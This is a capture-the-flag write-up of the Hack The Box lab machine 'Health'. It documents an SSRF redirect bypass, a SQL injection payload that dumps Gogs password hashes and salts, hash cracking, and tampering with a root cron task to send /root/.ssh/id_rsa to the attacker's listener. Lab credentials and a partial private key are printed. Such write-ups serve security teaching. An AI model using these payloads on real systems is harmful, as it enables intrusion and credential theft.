---
title: HTB - Health
description: Write-up for the machine "Health"
toc: true
authors: Alpharivs
tags:
  - HTB
  - SSRF
  - php
  - ctf
  - write-up
  - gogs
  - hacking
categories: writeups
date: '2023-01-08'
draft: false
featuredImage: /images/htb_writeups/Health.png
---

## Enumeration

### Host Discovery

First of all we will perform some basic recon.

```bash
# Adding the target IP as an alias for convenience.
❯ target='10.10.11.176'
❯ echo $target

❯ ping -c3 $target
PING 10.10.11.176 (10.10.11.176) 56(84) bytes of data.
64 bytes from 10.10.11.176: icmp_seq=1 ttl=63 time=313 ms
64 bytes from 10.10.11.176: icmp_seq=2 ttl=63 time=35.5 ms
64 bytes from 10.10.11.176: icmp_seq=3 ttl=63 time=34.3 ms
```

TTL value of ~64 is a solid indicator that this is a Linux system.

### Port Scanning

Let's perform a quick Nmap Scan.
```ruby
❯ sudo nmap $target -Pn -n -T4 -oG recon/nmap.out
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-08 19:10 CET
Nmap scan report for 10.10.11.176
Host is up (0.039s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
```
Now that we know which ports are open (or not sending a reset) we can proceed to run a detailed Nmap scan.
```ruby
❯ sudo nmap $target -sC -sV -n -Pn -T4 -oN recon/nmap.out
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-08 19:11 CET
Nmap scan report for 10.10.11.176
Host is up (0.039s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 32b7f4d42f45d330ee123b0367bbe631 (RSA)
|   256 86e15d8c2939acd7e815e649e235ed0c (ECDSA)
|_  256 ef6bad64d5e45b3e667949f4ec4c239f (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HTTP Monitoring Tool
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.98 seconds
```

Nmap confirms that we are dealing with a Linux box (shown as a Ubuntu box), we can also see that port 3000 is reported as filtered that means that nmap is not receiving a rst, this could mean that there are iptables rules present or a firewall as the packets seem to be just dropped.

## Website TCP 80

### Exploring the Website

Opening the site we can see the following:

![main](images/main.png)

We immediately see 2 things, a host name **health.htb** which we will proceed to add to our hosts file and a webapp which seems to perform a health check on a website that the user wants to monitor and can send a webhook notifying the state of the monitored website.

Before testing this WebApp we will perform some basic recon.

### Recon

Let's start by doing a quick enumeration of the tech stack.
```shell
❯ whatweb http://health.htb/
http://health.htb/ [200 OK] Apache[2.4.29], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], Email[contact@health.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.176], Laravel, Script[text/js], Title[HTTP Monitoring Tool], X-UA-Compatible[ie=edge]
```

And running a basic vulnerability scan.

```bash
❯ nuclei -u http://health.htb/ -ni -o recon/nuclei.out

[apache-detect] [http] [info] http://health.htb/ [Apache/2.4.29 (Ubuntu)]
[fingerprinthub-web-fingerprints:laravel] [http] [info] http://health.htb/
[fingerprinthub-web-fingerprints:laravel-framework] [http] [info] http://health.htb/
[tech-detect:laravel] [http] [info] http://health.htb/
[waf-detect:ats] [http] [info] http://health.htb/
[waf-detect:apachegeneric] [http] [info] http://health.htb/
[robots-txt-endpoint] [http] [info] http://health.htb/robots.txt
[options-method] [http] [info] http://health.htb/ [GET,HEAD]
[openssh-detect] [network] [info] health.htb:22 [SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7]
```
Running a directory brute-force doesn't return anything meaningful so we are skipping the results of **feroxbuster**.

Now that we have a profile of the website we will test it's functionality.

### Testing the WebApp

We will first test how the application works by listening with ncat in ports 80 which will act as the website that we want to monitor and 9001 which will receive the webhook informing of the state of the website.

![hook](images/hook.png)

After clicking **test** we can immediately see the following.

Ncat on port 80 has a hit.
```bash
❯ sudo ncat -lnvp 80
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.11.176.
Ncat: Connection from 10.10.11.176:43960.
GET / HTTP/1.0
Host: 10.10.14.34
Connection: close

^C
```
And after we manually closed the connection we can see that ncat in port 9001 has received the webhook hit.
```bash
❯ ncat -lnvp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.11.176.
Ncat: Connection from 10.10.11.176:58022.
POST / HTTP/1.1
Host: 10.10.14.34:9001
Accept: */*
Content-type: application/json
Content-Length: 100

{"webhookUrl":"http:\/\/10.10.14.34:9001\/","monitoredUrl":"http:\/\/10.10.14.34\/","health":"down"}
```
Now that we know that it works let's try to emulate a working website to see how it is supposed to actually work.

First we create a basic html index file to serve.
```html
<html>
  <head>
    <title>Health Check</title>
  </head>
  <body>
    <p>The Page is totally healthy and legit.</p>
  </body>
</html>
```

Next we listen on port 9001 to receive the webhook.

```bash
❯ ncat -lnvp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.11.176.
Ncat: Connection from 10.10.11.176:53092.
POST / HTTP/1.1
Host: 10.10.14.34:9001
Accept: */*
Content-type: application/json
Content-Length: 477

{"webhookUrl":"http:\/\/10.10.14.34:9001\/","monitoredUrl":"http:\/\/10.10.14.34\/","health":"up","body":"<html>\n  <head>\n    <title>Health Check<\/title>\n  <\/head>\n  <body>\n    <p>The Page is totally healthy and legit.<\/p>\n  <\/body>\n<\/html>\n","message":"HTTP\/1.0 200 OK","headers":{"Server":"SimpleHTTP\/0.6 Python\/3.10.9","Date":"Sun, 08 Jan 2023 18:29:41 GMT","Content-type":"text\/html","Content-Length":"135","Last-Modified":"Sun, 08 Jan 2023 18:29:18 GMT"}}
```

We see that we can extract the contents of the website that we are monitoring through the webhook, that opens the possibility of SSRF to get the contents of the filtered website!

### SSRF

There is some filtering present then trying to make the webapp monitor itself, no SSRF bypass that I've tested seemed to work (ex: **localhost**, **0177.00.00.01**, **017700000001**, **0x7f000001** etc...)

#### Filter Bypass

As we can't directly reach port 3000 due to the filtering the only option left is trying to redirect the webapp to itself.
![plan](images/plan.png)

A quick and easy way to achieve this is by using php and adding a Location header that redirects to our desired target.

So we should create a index.php file to serve.
```php
<?php
header('Location: http://10.10.11.176:3000/');
die();
?>
```
And then we just need to start a local php server and click test in the website.
```bash
❯ sudo php -S 10.10.14.34:80
[Sun Jan  8 19:59:24 2023] PHP 8.1.13 Development Server (http://10.10.14.34:80) started
[Sun Jan  8 19:59:32 2023] 10.10.11.176:46354 Accepted
[Sun Jan  8 19:59:32 2023] 10.10.11.176:46354 [302]: GET /
[Sun Jan  8 19:59:32 2023] 10.10.11.176:46354 Closing
```

To clearly see the extracted website we can save what we received in port 9001 to a file and proceed to do some jq magic!
```bash
❯ cat 3000.txt| jq -r .body > filtered.html
```

And voila we can see what's behind port 3000.
![gogs](images/gogs.png)

## Gogs

Now that we know that we are dealing with gogs and which version it is we can search for known exploits which they surely exist as it's a really old version.

We can quickly find this [exploit](https://www.exploit-db.com/exploits/35238), the only problem is that we need to trigger it through a SSRF and it's a SQLI so the only viable way is to download the [same version of gogs](https://github.com/gogs/gogs/releases/tag/v0.5.5) locally in order to figure out a payload that we could easily send through our SSRF vulnerability.


### Database Enumeration

Now that we have a local instance of Gogs running we can try out the exploit that we found. The exploit is a SQL injection so it makes sense to get a layout of the DB before attempting to test it.

```bash
sqlite3 gogs.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .schema user
CREATE TABLE `user` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `lower_name` TEXT NOT NULL, `name` TEXT NOT NULL, `full_name` TEXT NULL, `email` TEXT NOT NULL, `passwd` TEXT NOT NULL, `login_type` INTEGER NULL, `login_source` INTEGER NOT NULL DEFAULT 0, `login_name` TEXT NULL, `type` INTEGER NULL, `num_followers` INTEGER NULL, `num_followings` INTEGER NULL, `num_stars` INTEGER NULL, `num_repos` INTEGER NULL, `avatar` TEXT NOT NULL, `avatar_email` TEXT NOT NULL, `location` TEXT NULL, `website` TEXT NULL, `is_active` INTEGER NULL, `is_admin` INTEGER NULL, `rands` TEXT NULL, `salt` TEXT NULL, `created` NUMERIC NULL, `updated` NUMERIC NULL, `description` TEXT NULL, `num_teams` INTEGER NULL, `num_members` INTEGER NULL);
CREATE UNIQUE INDEX `UQE_user_lower_name` ON `user` (`lower_name`);
CREATE UNIQUE INDEX `UQE_user_name` ON `user` (`name`);
CREATE UNIQUE INDEX `UQE_user_email` ON `user` (`email`);
sqlite> 
```
There are 3 key thing to take from the enumeration of the local DB:
- We are dealing with SQLite
- There are 27 columns in the "user" table (as we can only do data exfiltration it makes sense to enumerate users)
- The name of the user is in the third field

With all that we can modify the PoC of the exploit that we previously found and transform it into a payload that could enumerate local users.

```SQl
/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,name,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/from/**/user--/**/-
```
It works
```json
{
  "data": [
    {
      "username": "omegon",
      "avatar": "//1.gravatar.com/avatar/3e899d265c6a53baa769872fcfe2026d"
    },
    {
      "username": "omegon",
      "avatar": "//1.gravatar.com/avatar/15"
    }
  ],
  "ok": true
}
```
So let's craft a payload that could extract all the data of the user ant let's test it remotely exploiting the SSRF that we found earlier.

```sql
/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,name||':'||email||':'||passwd||':'||salt,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27/**/from/**/user--/**/-
```
It worked as intended.
```json
❯ cat exfil.txt| jq -r .body | jq .
{
  "data": [
    {
      "username": "susanne",
      "avatar": "//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce"
    },
    {
      "username": "susanne:admin@gogs.local:66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37:sO3XIbeW14",
      "avatar": "//1.gravatar.com/avatar/15"
    }
  ],
  "ok": true
}
```

## Crack the Hash

After some investigation we can see that gogs hashes passwords using "*PBKDF2-HMAC-SHA256*". According to hashcat example hashes the format should be:
```text
sha256:1000:MTc3MTA0MTQwMjQxNzY=:PYjCU215Mi57AYPKva9j7mvF4Rc5bCnt
```
our data is in hex so we need to transform it into base64 and we also need to know how many rounds are used so we do what every professional should do ... ask chatGPT nicely ... and we get the answer "*10 000 rounds*"

Now we transform our hash to base64 and crack it
```bash
# Hash
❯ echo "66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37" | xxd -r -p | base64 -w0
ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
# Salt
❯ echo -n "sO3XIbeW14" | base64
c08zWEliZVcxNA==
# Hashcat formatted
sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
```
We can successfully crack it.
```bash
sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:february15
```

## User Susanne

We know that SSH is listening on the machine so let's first try our new credentials there.

```bash
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64)

...(SNIP)...

susanne@health:~$ whoami
susanne
```
After not finding anything during our standard enumeration let's examine the contents of the web directory to see if we can find something interesting.

At first glance we can already see that there is a *.env* file which contains environment variables and inside there are credentials for *mySQL*.

```bash
susanne@health:/var/www/html$ cat .env
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+
```
We can use those credentials to examine the *laravel* DB.

```bash
susanne@health:/$ mysql -u laravel -p'MYsql_strongestpass@2014+' laravel
mysql> show tables;
+------------------------+
| Tables_in_laravel      |
+------------------------+
| failed_jobs            |
| migrations             |
| password_resets        |
| personal_access_tokens |
| tasks                  |
| users                  |
+------------------------+
```
For now we will just take note of the table names.

### CronJob

No having found anything more interesting we should try to enumerate for scheduled tasks running in the background using *pspy64*

```bash
2023/02/04 16:51:01 CMD: UID=0    PID=7651   | php artisan schedule:run 
2023/02/04 16:51:01 CMD: UID=0    PID=7650   | /bin/bash -c sleep 5 && /root/meta/clean.sh 
2023/02/04 16:51:01 CMD: UID=0    PID=7654   | grep columns 
2023/02/04 16:51:01 CMD: UID=0    PID=7652   | sh -c stty -a | grep columns 
```

Artisan is being run by root, artisan is used to interact with Laravel so we can use artisan ourselves to enumerate the routes of the webapp.

### Enumerating the WebApp

```bash
susanne@health:/var/www/html$ php artisan route:list
+--------+----------+---------------------+---------+------------------------------------------------------------+------------------------------------------+
| Domain | Method   | URI                 | Name    | Action                                                     | Middleware                               |
+--------+----------+---------------------+---------+------------------------------------------------------------+------------------------------------------+
|        | GET|HEAD | /                   |         | Closure                                                    | web                                      |
|        | GET|HEAD | api/user            |         | Closure                                                    | api                                      |
|        |          |                     |         |                                                            | App\Http\Middleware\Authenticate:sanctum |
|        | GET|HEAD | sanctum/csrf-cookie |         | Laravel\Sanctum\Http\Controllers\CsrfCookieController@show | web                                      |
|        | POST     | webhook             | webhook | App\Http\Controllers\TaskController@create                 | web                                      |
|        | GET|HEAD | webhook/{id}        |         | Closure                                                    | web                                      |
+--------+----------+---------------------+---------+------------------------------------------------------------+------------------------------------------+
```
The interesting one is webhook which is located in *App\Http\Controllers\TaskController*.

After some digging in we can see that the behavior for the *create* option is different than the *test* function that we used to test the webhook so let's investigate further.

Here we can see the option in the webapp.
![task](images/task.png)

And here we can see how the backend handles it.

```php
$show = Task::create($validatedData);
return redirect('/webhook/' . $show->id)->with('message', 'Webhook is successfully created');
```
Following the import of the Task function we end up in the following code.
```php
class Task extends Model
{

    use Uuids;
    use HasFactory;

    protected $fillable = ['webhookUrl', 'monitoredUrl', 'frequency', 'onlyError'];

    public $incrementing = false;

    protected $keyType = 'string';

}
```
The $fillable model looks like the contents of a DB table, so let's check the laravel DB.

### Tasks Table

First let's create a new task and let's see if by any chance the task is stored in the laravel DB.

```bash
mysql> select * from tasks;
+--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+
| id                                   | webhookUrl               | onlyError | monitoredUrl        | frequency   | created_at          | updated_at          |
+--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+
| b6b55b4b-1610-42e1-8a3d-2a5ed765ae2d | http://10.10.14.34:9001/ |         0 | http://10.10.14.34/ | */5 * * * * | 2023-02-04 17:09:32 | 2023-02-04 17:09:32 |
+--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+
```
We confirm that the task is stored in the DB.

## Root

Knowing that the task that we create is stored in the DB and that theres a cronjob executing in the background as root that runs the created tasks in order to find a potential way of exploiting that we need to see how the tasks are processed in order to know what field we can poison.

```php
class HealthChecker
  {
    public static function check($webhookUrl, $monitoredUrl, $onlyError = false)
    {
      $json = [];
      $json['webhookUrl'] = $webhookUrl;
      $json['monitoredUrl'] = $monitoredUrl;
      $res = @file_get_contents($monitoredUrl, false);
      if ($res) {
        if ($onlyError) {
          return $json;
        }
...(SNIP)...
```
The "*monitoredUrl*" field is being passed into the *file_get_contents* function so we can modify the task stored in the DB and trick root into fetching his private SSH key for us.

### Extract id_rsa

Immediately after creating a new task we confirm that it's in the DB and then we proceed to modify it.

```bash
mysql> update tasks set monitoredUrl = 'file:///root/.ssh/id_rsa';

...(SNIP)...

mysql> select * from tasks;
+--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
| id                                   | webhookUrl               | onlyError | monitoredUrl             | frequency   | created_at          | updated_at          |
+--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
| 28073286-067b-4033-907e-d1e753c2814a | http://10.10.14.34:9001/ |         0 | file:///root/.ssh/id_rsa | */5 * * * * | 2023-02-04 17:14:15 | 2023-02-04 17:14:15 |
+--------------------------------------+--------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
1 row in set (0.00 sec)
```

And after some time we have a hit in our local server.

```bash
{"webhookUrl":"http:\/\/10.10.14.34:9001\/","monitoredUrl":"file:\/\/\/root\/.ssh\/id_rsa","health":"up","body":"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n"}
```

We just need to use some jq to extract the data that we want.

```bash
❯ cat root| jq -r .body
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9/jG5NPqc2TfW4Nlj9gE
KScDJTrF0vXYnIy4yUwM4/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq
IMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH/
KuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL/XP1hN4B7egzjcV8Rphj6XRE3bhgH
7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8
W6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae
NPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9
t3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8/v/3Jeesznu+RJ+G0ezyUGfi0wpQRoD
(...SNIP...)
```
And then log in.

```bash
❯ ssh -i root_key root@health.htb
root@health:~# cat root.txt 
28376d261157e7.........
```

Lux-Sit